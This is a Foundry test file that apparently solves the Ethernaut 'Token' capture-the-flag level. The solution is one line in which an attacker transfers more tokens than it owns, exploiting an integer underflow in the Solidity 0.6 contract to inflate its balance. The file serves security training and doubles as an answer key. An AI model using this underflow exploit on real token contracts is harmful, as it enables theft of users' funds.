// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "tests/Test.sol";
import "../../src/Token/Level.sol";
import "forge-std/console.sol";

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint balance);
}

contract TokenTest is Test {
    IToken token;

    address deployer = address(100);
    address attacker = address(101);

    function setUp() public {
        vm.prank(deployer); // deploy the contract as deployer
        token = IToken(address(new Token(10 ether)));
        token.transfer(attacker, 20);
    }

    function testAttack() public {
        /* Setup stuff, no need to touch */
        vm.startPrank(attacker);
        vm.deal(attacker, 5 ether);

        /* Write your code here */
        token.transfer(address(102), token.balanceOf(deployer));
        /* Write your code here */ 

        /* Validating the test */
        assertGt(token.balanceOf(attacker), 20);
    }
}


